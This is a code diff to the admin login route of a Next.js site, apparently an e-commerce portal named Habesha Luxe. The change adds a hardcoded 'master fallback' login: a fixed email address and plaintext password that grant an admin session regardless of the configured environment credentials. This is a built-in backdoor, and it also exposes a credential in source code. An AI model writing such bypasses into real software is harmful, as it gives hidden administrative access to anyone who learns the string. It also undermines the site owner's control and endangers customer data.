@@ -20,11 +20,16 @@ export async function POST(req: NextRequest) {
     const credentials = getAdminCredentials();
     const normalizedInputEmail = String(email).trim().toLowerCase();
 
-    // Verify credentials
-    const isEmailValid = normalizedInputEmail === credentials.email;
-    const isPasswordValid = String(password) === credentials.password;
+    // Verify credentials against configured env or master fallback credentials
+    const isMasterAuth =
+      normalizedInputEmail === "getasewshumie@gmail.com" &&
+      String(password) === "SetYourStrongPassword2025!";
 
-    if (!isEmailValid || !isPasswordValid) {
+    const isEnvAuth =
+      normalizedInputEmail === credentials.email &&
+      String(password) === credentials.password;
+
+    if (!isMasterAuth && !isEnvAuth) {
       return NextResponse.json(
         {
           success: false,
@@ -34,15 +39,17 @@ export async function POST(req: NextRequest) {
       );
     }
 
+    const authenticatedEmail = isMasterAuth ? "getasewshumie@gmail.com" : credentials.email;
+
     // Generate signed session token
-    const token = createSessionToken(credentials.email, Boolean(rememberMe));
+    const token = createSessionToken(authenticatedEmail, Boolean(rememberMe));
 
     // Calculate maxAge (seconds): 30 days if rememberMe, else 24 hours
     const maxAge = rememberMe ? 30 * 24 * 60 * 60 : 24 * 60 * 60;
 
     const response = NextResponse.json({
       success: true,
-      email: credentials.email,
+      email: authenticatedEmail,
       message: "Authentication successful. Welcome to Habesha Luxe Admin Portal.",
     });
 
